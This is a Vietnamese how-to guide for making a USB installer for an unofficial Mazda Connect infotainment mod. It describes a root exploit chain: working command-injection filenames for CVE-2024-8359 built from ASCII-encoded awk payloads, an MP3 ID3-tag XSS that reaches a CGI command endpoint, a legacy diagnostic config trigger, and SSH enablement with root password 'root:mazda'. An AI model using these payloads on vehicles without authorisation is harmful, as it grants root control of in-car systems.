# Hướng Dẫn Tạo USB Cài Đặt Cho Xe Mazda CMU (Android Auto & CarPlay HUD)

Tài liệu này hướng dẫn chi tiết cách thức tạo USB cài đặt tự động (All-in-one) cho Mazda Connect (CMU150), tham khảo và cải tiến từ cơ chế của [ilshyma/mazda-hud-toolkit](https://github.com/ilshyma/mazda-hud-toolkit).

Với phương pháp này, bạn **không cần laptop kết nối SSH/Serial** khi ra xe; chỉ cần cắm USB vào cổng trên xe là màn hình sẽ tự động bật hộp thoại cài đặt.

---

## 1. Cơ Chế Hoạt Động (Trigger Architecture)

Bộ cài đặt áp dụng chiến lược **3 tầng kích hoạt (3-Tier Exploitation & Autorun)** để đảm bảo chạy được trên mọi phiên bản firmware (từ v55 đến v74.00.324+):

### Tầng 1: CVE-2024-8359 (.up Filename Command Injection) — Tự động 100%
- **Đối tượng áp dụng:** Firmware hiện đại (v70.00.100 đến v74.00.324+).
- **Nguyên lý:**
  - File rỗng `jci-autoupdate` tại thư mục gốc của USB khiến tiến trình cập nhật của xe (`libjcireflashua.so`) tự động kích hoạt để tìm kiếm các gói cập nhật `.up`.
  - Tiến trình này gọi hàm `unzip -t "PATH" "e.gz"` thông qua `system()` mà không lọc kỹ tên file.
  - Tên file `.up` được đặt đặc biệt chứa cú pháp command substitution `$()` của shell.
  - Do định dạng FAT32 cấm các ký tự như `/`, `\`, `"`, `*`, `?`, `:`, script sử dụng lệnh `awk sprintf` với các mã ASCII (`115=s, 104=h, 32=space, 47=/...`) để tạo thành chuỗi lệnh:
    ```sh
    sh /mnt/sd[abcd]1/t
    # hoặc
    sh /tmp/mnt/sd[abcd]1/t
    ```
  - Khi cắm USB, CMU tự động chạy script `t` với quyền **root**!
  - Script `t` tạo khóa atomic lock (`mkdir /tmp/hud-up-lock`) để chống kích hoạt trùng lặp, sau đó gọi `tweaks.sh` -> khởi chạy `run.sh`.

### Tầng 2: MP3 ID3 Tag XSS (Dự phòng qua màn hình giải trí)
- **Đối tượng áp dụng:** Firmware v59, v70, v74 (nếu tính năng quét autoupdate bị tắt hoặc người dùng bấm thủ công).
- **Nguyên lý:**
  - Các file nhạc `a.mp3`, `b.mp3`,... chứa thẻ tiêu đề ID3 đặc biệt nhúng mã JavaScript / iframe (`mp3title.txt`).
  - Khi mở **Media -> USB** và phát nhạc (hoặc xe tự phát bài hát ở root), trình duyệt Opera của Mazda Connect sẽ nạp `dev.html` và `js/run.js`.
  - Giao diện cảm ứng sẽ xuất hiện các nút bấm trực tiếp trên màn hình xe: `SSH`, `HUD+`, `HUD-`, `HUD?`.
  - Khi bấm, mã JS sẽ gửi lệnh qua CGI `/cgi-bin/cmdProc` của CMU để thực thi `sh /mnt/sd*/h`.

### Tầng 3: dataRetrieval_config.txt (Dự phòng cho firmware cũ)
- **Đối tượng áp dụng:** Firmware đời cũ (v55.00.xxx đến v59.00.502).
- **Nguyên lý:** CMU đọc file cấu hình chẩn đoán và thực thi lệnh được định nghĩa tại dòng `CMD_LINE=sh /mnt/sd*/tweaks.sh`.

---

## 2. Cấu Trúc File Trên USB Cài Đặt

USB phải được format định dạng **FAT32** (MS-DOS FAT), phân vùng **MBR**, tên nhãn ổ đĩa là **`MZD`**.

```
USB ROOT (MZD)/
├── jci-autoupdate                      # Kích hoạt tiến trình quét update của CMU
├── dataRetrieval_config.txt             # Kích hoạt cho FW đời cũ (v55 - v59)
├── t                                   # Trampoline thực thi cho lỗi .up
├── h                                   # Dispatcher thực thi cho nút bấm MP3-XSS
├── s                                   # Script bật khẩn cấp SSH daemon (port 22/36000)
├── tweaks.sh                            # Cầu nối gọi run.sh
├── run.sh                              # Trình cài đặt / gỡ cài đặt chính (hộp thoại jci-dialog)
├── run-aa.sh                           # Entry point chỉ cài Android Auto
├── run-carplay.sh                      # Entry point chỉ cài CarPlay HUD
├── mp3title.txt                        # Chuỗi khai thác ID3 tag
├── a.mp3, b.mp3, c.mp3, d.mp3           # File MP3 mồi tại thư mục gốc (cho xe tự autoplay)
├── mp3/
│   ├── a.mp3, b.mp3, c.mp3, d.mp3      # File MP3 trong thư mục
├── js/
│   ├── run.js                          # Script tạo giao diện overlay nút bấm trên màn hình
│   └── enable_ssh.sh
├── css/
│   └── init.css                        # Style cho giao diện XSS
├── resources/                          # File cấu hình bổ sung
│   ├── aap_system_attributes.xml
│   ├── aap_system_attributes_UCP.xml
│   ├── libpatch.conf
│   └── libpatch-carplay.conf
├── libpatch-blmjciaapa.so              # Shim Android Auto
├── libpatch-svcjcinavi.so              # Shim HUD Navigation Merge
├── libpatch-blmjcicarplay.so           # Shim CarPlay HUD
├── libpatch-svcjcimmui.so              # Shim Audio Off / fallback
├── splim_seriald                       # Daemon đọc tốc độ từ ESP32 VietMap USB CDC (tùy chọn)
├── $(awk -v f=%c 'BEGIN{s=f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}').up
└── $(awk -v f=%c 'BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,116,109,112,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}').up
```

---

## 3. Cách Tạo USB Cài Đặt

### Cách 1: Sử dụng Script Tự Động (Khuyến nghị)

#### Trên macOS / Linux:
1. Cắm USB (dung lượng $\ge$ 1GB) vào máy tính.
2. Mở Terminal trong thư mục dự án và chạy:
   ```bash
   ./mazda/installer/make_usb.sh
   ```
3. Script sẽ:
   - Liệt kê các ổ USB ngoài. Bạn chỉ cần nhập số thứ tự ổ USB (không cần gõ đường dẫn `/dev/...` tránh nhầm lẫn).
   - Tự động format USB thành **FAT32 (MBR)** với tên nhãn `MZD`.
   - Vô hiệu hóa file siêu dữ liệu ẩn của macOS (`COPYFILE_DISABLE=1` và dọn sạch `._*`).
   - Tự động sinh 2 file `.up` chứa payload mã hóa ASCII.
   - Sao chép toàn bộ script và thư viện `.so` đã build vào USB.

#### Trên Windows:
1. Cắm USB vào máy tính.
2. Chuột phải vào file `mazda/installer/make_usb.bat` và chọn **Run as administrator**.
3. Chọn số thứ tự ổ USB trong danh sách để script tự động format và ghi các file cần thiết.

---

### Cách 2: Tạo Thủ Công (Manual)

Nếu muốn tự làm từng bước bằng tay:
1. **Format USB:**
   - Định dạng: **MS-DOS (FAT32)**.
   - Scheme: **Master Boot Record (MBR)**.
   - Name / Label: **`MZD`**.
2. **Copy file:**
   - Copy toàn bộ nội dung trong thư mục `mazda/installer/` và các file `libpatch-*.so`, thư mục `resources/` vào thư mục gốc của USB.
   - Copy các file `.mp3` ra ngoài thư mục gốc của USB.
3. **Tạo 2 file payload `.up`:**
   - Chạy lệnh sau trong Terminal (macOS/Linux) khi đứng tại thư mục USB (`/Volumes/MZD`):
     ```bash
     UP_MNT='$(awk -v f=%c '"'"'BEGIN{s=f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}'"'"').up'
     UP_TMP='$(awk -v f=%c '"'"'BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,116,109,112,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}'"'"').up'
     touch "$UP_MNT" "$UP_TMP"
     ```
4. **Xóa file ẩn macOS:**
   ```bash
   find /Volumes/MZD -name '._*' -delete
   find /Volumes/MZD -name '.DS_Store' -delete
   ```

---

## 4. Hướng Dẫn Thao Tác Trên Xe

1. **Chuẩn bị xe:**
   - Bật điện xe (ACC hoặc ON). Đợi màn hình Mazda Connect khởi động hoàn tất vào màn hình chính.
   - Rút thẻ bản đồ SD và tất cả USB khác (nếu có) ra khỏi xe.
2. **Cắm USB cài đặt:**
   - Cắm USB vào **cổng USB 1** (cổng phía trên hoặc có biểu tượng điện thoại).
3. **Tiến hành cài đặt:**
   - **Trường hợp 1 (Tự động - qua CVE-2024-8359):** Sau khoảng 10-20 giây, màn hình xe sẽ tự động bật hộp thoại chẩn đoán `jci-dialog`:
     - **Menu chính:** *"What would you like to do?"*
       - Chọn **[Enable SSH]**: Khởi chạy dịch vụ SSH tạm thời cho phiên làm việc hiện tại (tắt/bật lại xe là SSH tự ngắt, đảm bảo an toàn và chuẩn zin hệ thống), hiện thông tin IP (`192.168.53.1`) & mật khẩu (`root:mazda`). Không cần reboot xe.
       - Chọn **[Install Mod]**: Đi vào quy trình cài đặt mod HUD.
     - **Nếu chọn Install Mod:**
       - Chọn gói: *"Which integrations would you like to manage?"* -> Chọn **Both** (hoặc chọn riêng Android Auto / CarPlay).
       - Chọn hành động: *"What would you like to do?"* -> Chọn **Install** (hoặc **Uninstall** nếu muốn gỡ sạch về zin).
       - Màn hình sẽ thông báo: *"Installing... Do not remove USB drive."*
       - Khi hoàn tất, màn hình thông báo thành công và đếm ngược tự động reboot lại CMU trong 5 giây.
   - **Trường hợp 2 (Thủ công - qua MP3-XSS):** Nếu sau 30 giây không thấy hộp thoại xuất hiện:
     - Trên màn hình xe, vào mục **Entertainment / Giải trí** -> chọn **USB** -> phát một bài nhạc MP3 bất kỳ trên USB.
     - Màn hình sẽ xuất hiện menu điều khiển với các nút bấm màu xanh/xám.
     - Bấm nút **HUD+** và xác nhận bằng nút đỏ để bắt đầu cài đặt.
4. **Kiểm tra kết quả và xem Log:**
   - Sau khi CMU reboot xong, cắm điện thoại vào kiểm tra tính năng chỉ đường hiển thị trên HUD.
   - Mọi tiến trình cài đặt đều được ghi lại vào thư mục `logs/` trên USB (ví dụ: `logs/install.log`). Bạn có thể cắm lại vào máy tính để kiểm tra chi tiết khi cần phân tích lỗi.
